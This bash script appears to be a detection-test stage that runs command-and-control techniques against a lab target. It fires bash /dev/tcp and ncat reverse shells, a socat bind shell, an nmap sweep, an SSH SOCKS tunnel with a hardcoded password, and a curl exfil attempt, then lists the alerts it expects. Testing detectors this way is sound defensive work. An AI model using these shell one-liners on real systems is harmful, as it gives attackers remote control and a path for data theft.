#!/usr/bin/env bash
# Stage 6 — command and control: two reverse shells, a bind shell,
# tunneling, outbound recon from the box, and an exfil attempt to an
# external host.
set -euo pipefail
. "$(dirname "$0")/lib.sh"

need nc "netcat (nc)"

check_target

say "reverse shell #1 — bash /dev/tcp (listener on $HOST_IP:4444)"
LOG=$(mktemp)
nc -l 4444 >"$LOG" 2>/dev/null &
LISTENER=$!
sleep 1
rce "bash -c 'bash -i >& /dev/tcp/$HOST_IP/4444 0>&1'"
sleep 2
kill "$LISTENER" 2>/dev/null || true
echo "---- listener caught: -------------------------------------------"
cat "$LOG"
rm -f "$LOG"

say "reverse shell #2 — ncat -e (listener on $HOST_IP:4445)"
nc -l 4445 >/dev/null 2>&1 &
LISTENER=$!
sleep 1
rce "ncat -e /bin/sh $HOST_IP 4445"
sleep 2
kill "$LISTENER" 2>/dev/null || true

say "bind shell — socat listener on the target (port 31337)"
rce "socat TCP-LISTEN:31337,reuseaddr,fork EXEC:/bin/sh >/dev/null 2>&1 &"
sleep 1
printf 'id\n' | nc -w 3 "$TARGET" 31337 || note "no reply from the bind shell"
rce 'pkill socat'

say "outbound recon from the compromised box"
rce 'nmap -sn 192.168.56.0/24' | strip

say "SSH dynamic port forward (SOCKS proxy on the target)"
rce "sshpass -p backup123 ssh -D 9050 -o StrictHostKeyChecking=no -o PubkeyAuthentication=no svc_backup@localhost sleep 5 >/dev/null 2>&1 &"

say "exfil attempt to an external host (203.0.113.66, TEST-NET)"
rce 'curl -m 5 -s http://203.0.113.66/x' | strip

note "expected on the target:"
note "  process CRITICAL rshell-devtcp, rshell-netcat"
note "  network CRITICAL connection to suspicious port — the shells dial"
note "                 home to 4444/4445, which elmer distrusts"
note "  process HIGH    tunnel-socat-listen; socat and ncat also hit"
note "                 known_bad_filenames"
note "  network HIGH    socket bound to suspicious port (31337, 9050)"
note "  process MEDIUM  recon-nmap — scanning from the box itself"
note "  process MEDIUM  tunnel-ssh-forward — ssh -D"
note "  network         outbound to 203.0.113.66 flagged external"
